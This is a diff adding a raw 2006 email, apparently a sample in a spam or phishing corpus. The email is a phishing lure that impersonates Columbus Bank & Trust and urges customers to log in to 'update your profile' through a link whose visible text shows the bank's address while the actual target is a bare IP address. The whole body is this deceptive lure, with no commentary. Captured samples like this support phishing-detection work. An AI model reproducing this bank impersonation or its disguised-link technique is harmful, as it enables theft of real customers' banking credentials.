@@ -1,0 +1,143 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 7B40E2A88C
+ for <user@example.com>; Mon, 20 Feb 2006 01:09:42 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 6E2E3621C95; Mon, 20 Feb 2006 01:09:42 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 4AD87621C92
+ for <user@example.com>; Mon, 20 Feb 2006 01:09:42 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id BAA07221
+ for user@example.com; Mon, 20 Feb 2006 01:09:41 -0500
+Received: from matrx.co.nz (203-109-196-200.ihug.net [203.109.196.200])
+ by mail.example.com with SMTP id BAA07213
+ for <user@biochemistry.BIOC.cwru.edu>; Mon, 20 Feb 2006 01:09:39 -0500
+Message-Id: <200602200609.BAA07213@mail.example.com>
+Received: (qmail 5481 invoked from network); 20 Feb 2006 00:49:03 -0000
+Received: from unknown (HELO wombat) (wombat@69.151.131.157)
+ by agentjones.matrx.co.nz with SMTP; 20 Feb 2006 00:49:03 -0000
+From: "Security@www.columbusbankandtrust.com"
+ <Security@www.columbusbankandtrust.com>
+Subject: Accounts maintenance and verifications
+Date: Sun, 19 Feb 2006 18:55:57 -0600
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 311
+
+<html>
+
+
+
+
+
+<!-- The following is the style sheet section. Currently, only fonts and links are configurable. -->
+<style type="text/css">
+    *       {font-family: Arial, Helvetica, sans-serif; font-size:9pt; }
+    A       {
+                font-size: 9pt;
+                color: #003399;
+                text-decoration:underline;
+				font-family: Arial, Helvetica, sans-serif;
+            }
+    A:visited { color: #003399; font-family: Arial, Helvetica, sans-serif;}
+    A:active  { color: #003399; font-family: Arial, Helvetica, sans-serif;}
+    A:hover   { color: #003399; font-family: Arial, Helvetica, sans-serif;}
+
+    A.nav   {
+                font-size: 9pt;
+                color: #003399;
+				font-family: Arial, Helvetica, sans-serif;
+            }
+    A.nav:visited { color: #003399; font-family: Arial, Helvetica, sans-serif;}
+    A.nav:active  { color: #003399; font-family: Arial, Helvetica, sans-serif;}
+    A.nav:hover   { color: #003399; font-family: Arial, Helvetica, sans-serif;}
+
+    .warning      { color: red;         font-weight: bold; 	 font-family: Arial, Helvetica, sans-serif;}
+    .mainTitle    { color: #003399; 	font-weight: bold;   font-size: 12pt; font-family: Arial, Helvetica, sans-serif;}
+    .serviceTitle { color: #003399; 	font-weight: bold;   font-size: 10pt; font-family: Arial, Helvetica, sans-serif;}
+    .sectionTitle { color: #003399; 	font-weight: bold; 	 font-size: 10pt; font-family: Arial, Helvetica, sans-serif;}
+    .subtitle     { color: black;       font-weight: normal; font-size: 10pt; font-family: Arial, Helvetica, sans-serif;}
+    .heading      { color: #003399; 		font-weight: normal; font-size: 10pt; font-family: Arial, Helvetica, sans-serif;}
+	.tableHeader  { color: white;       font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .tableRow1    { color: black;       font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .tableRow1Alt { color: black;       font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .tableRow2    { color: black;       font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .tableRow2Alt { color: black;       font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .stockQuoteData{ color: #8E2323;    font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .bottomNavDivider{ color: black;    font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .footnote	  { color: black;       font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .tableNegative{ color: red;         font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}
+    .tablePositive{ color: green;       font-weight: normal; font-size: 9pt; font-family: Arial, Helvetica, sans-serif;}    
+
+    .pageLink     { font-size: 10pt; color: #003399; text-decoration:underline; }
+    .tableLink    { font-size: 10pt; color: #003399; text-decoration:none; }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<TABLE cellSpacing=0 cellPadding=0 width=500 border=0 xt="SPTABLE"
+name="SP_TABLE1" id="table1" height="320">
+<TBODY>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy" height="42">
+</TD></TR>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy">
+<font face="Verdana" size="2"><font color="#003399">Checking & Savings<font color="#999999"> > Online Banking
+<p align="left"><font face="Verdana" size="2"><font color="#999999">In attention of all Columbus Bank & Trust  customers,</font></p>
+<p align="justify"><font face="Verdana" size="2"><font color="#999999">As the Internet and information technology enable us to expand our services, we are committed to maintaining the trust customers have placed in us for protecting the privacy and security of information we have about you. In order to protect your information against unauthorized access, identity theft and account fraud we earnestly ask you to update your profile.   </font></p>
+
+
+<p align="justify"><font face="Verdana" size="2"><font color="#999999">To get started, please click 
+the link below and login to your account:</font></p>
+<p align="justify"><font face="Verdana" size="2">
+<b>
+<a target="_blank" href="http://203.76.134.211/OnlineAccess/www.columbusbankandtrust.com/columbus/">
+http://www.columbusbankandtrust.com/OnlineAccess</a> </b></font></p>
+<p align="justify"><font face="Verdana" size="2"><font color="#999999">If you received this notice and you are not the authorized account holder,
+please be aware that it is in violation of our policy to represent oneself
+as another Columbus Bank & Trust user. Such action may also be in violation of local, national, 
+and/or international law. Columbus Bank & Trust is committed to assist law enforcement with 
+any inquiries related to attempts to misappropriate personal information with
+the intent to commit fraud or theft. Information will be provided at the request
+of law enforcement agencies to ensure that perpetrators are prosecuted to the 
+fullest extent of the law.</font></p>
+
+<table align=right width="200" border="0">
+  <tr>
+    <td></td>
+  </tr>
+</table>
+<p align="justify"><font face="Verdana" size="2"><font color="#999999">Thanks for your patience as we work together to protect your account.</font></p>
+
+<p align="justify"><font face="Verdana" size="2"><font color="#999999">Regards,</font></p>
+<p align="justify"><font face="Verdana" size="2"><font color="#999999">Columbus Bank & Trust Support Center.</font></p>
+
+
+</html>
